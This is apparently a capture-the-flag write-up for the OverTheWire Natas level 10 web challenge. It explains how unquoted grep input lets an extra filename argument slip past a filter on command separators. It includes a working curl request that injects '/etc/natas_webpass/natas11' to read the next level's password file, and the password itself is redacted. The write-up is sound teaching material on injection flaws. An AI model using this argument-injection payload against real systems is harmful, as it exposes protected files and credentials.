# Filtered but Broken

**Platform:** OverTheWire Natas (mirrored by PCGCTF) · **Challenge ID:** 17 · **Category:** Web Exploitation — Natas · **Points:** 100

**Status:** Verified on OverTheWire from the saved live-auth record. Next-level password redacted.

## The challenge

natas10 adds a filter for `;`, `|` and `&` — closing the previous trick. Get natas11's password anyway.

## Solving it

The filter blocks the command separators but still doesn't quote the input, and it doesn't block spaces. In `grep -i $key dictionary.txt`, spaces let me add a *second* filename argument — no new command needed, I just make grep also read the password file:

```sh
curl -sS --user natas10 --data-urlencode 'needle=.* /etc/natas_webpass/natas11' \
  -d 'submit=Search' http://natas10.natas.labs.overthewire.org/index.php
```

`.*` matches every line, and grep prints matches from both files — so natas11's password shows up in the output.

## Verification record

The [saved authentication ledger](../evidence/ready-natas/natas-verification-redacted.json) records the method check and next-level authentication. Runtime passwords are redacted in that ledger.

## Flag

Recovered natas11 password (kept private); PCGCTF candidate is `pcgCTF{<natas11 password>}`.

## Takeaway

Blocking separators isn't the same as quoting input. As long as the value lands in the command unquoted, argument structure (here, an extra filename) is still exploitable.

## References

- [Original archived challenge](../../challenges/solved/web-exploitation-natas/017-filtered-but-broken/README.md)
